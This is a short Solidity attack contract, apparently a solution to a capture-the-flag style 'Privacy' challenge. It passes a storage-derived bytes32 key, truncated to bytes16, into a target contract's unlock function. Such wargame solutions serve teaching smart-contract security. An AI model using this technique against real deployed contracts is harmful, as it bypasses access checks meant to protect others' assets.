// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IPrivacy {
  function unlock(bytes16 _key) external;
}

contract PrivacyAttacker {
  constructor() {}

  function attack(address targetAddr, bytes32 key) external {
    IPrivacy target = IPrivacy(targetAddr);
    target.unlock(bytes16(key));
  }
}
